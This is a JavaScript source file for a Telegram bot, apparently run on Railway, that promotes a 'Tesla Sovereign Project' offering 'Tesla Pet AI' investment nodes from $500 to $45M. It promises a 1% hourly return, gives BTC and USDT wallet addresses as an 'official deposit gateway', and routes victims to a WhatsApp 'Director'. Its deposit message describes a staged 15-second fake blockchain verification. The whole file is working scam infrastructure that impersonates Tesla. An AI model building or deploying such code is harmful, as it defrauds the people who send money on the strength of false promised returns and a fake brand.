const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const app = express();

// --- CONFIGURATION ---
const bot = new Telegraf(process.env.BOT_TOKEN);
const PORT = process.env.PORT || 3000;
const DIRECTOR_WHATSAPP = "12483462118";

const WALLETS = {
    BTC: "bc1qrp46x9rdemwlnc88m088yk8d304mj7ayu8scfa",
    USDT_ERC20: "0x7F02ef79D1648e8674cc1012fC9e45714A8820A3",
    USDT_BEP20: "0x7F02ef79D1648e8674cc1012fC9e45714A8820A3"
};

// --- TESLA PROJECT LOGIC ---
bot.start((ctx) => {
    ctx.replyWithMarkdownV2(
        `🏛️ *Welcome to the Tesla Sovereign Project 2026*\\.\n\n` +
        `Manage your assets from $500 to $45M with your *Tesla Pet AI*\\.\n` +
        `Growth only activates upon verified purchase or investment\\.`,
        Markup.inlineKeyboard([
            [Markup.button.webApp("📊 Open Tesla Dashboard", process.env.APP_URL || "https://tesla-project.com")],
            [Markup.button.url("📱 Contact Director Chris", `https://wa.me/${DIRECTOR_WHATSAPP}`)]
        ])
    );
});

// Command for Deposit / Purchase Info
bot.command('deposit', (ctx) => {
    ctx.replyWithMarkdownV2(
        `💳 *OFFICIAL TESLA DEPOSIT GATEWAY*\n\n` +
        `*BTC:* \`${WALLETS.BTC}\`\n` +
        `*USDT (ERC20/BEP20):* \`${WALLETS.USDT_ERC20}\`\n\n` +
        `_Note: After sending payment, the system will spin for 15s to verify blockchain nodes before showing PENDING status\\._`
    );
});

// Command for Tesla Pets / Investment
bot.command('invest', (ctx) => {
    ctx.replyWithMarkdownV2(
        `🐾 *TESLA PET AI & INVESTMENT NODES*\n\n` +
        `• *Starter Node:* $500\n` +
        `• *Tesla Ownership:* $300,000\n` +
        `• *Sovereign Estate:* Up to $45M\n\n` +
        `Growth: 1% Hourly ROI (Locked until activation)`
    );
});

// Launch Bot
bot.launch().then(() => console.log("Tesla Bot is live."));

// --- SERVER LOGIC (Keep-Alive for Railway) ---
app.get('/', (req, res) => res.send('Tesla Sovereign Node is Active.'));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// Graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
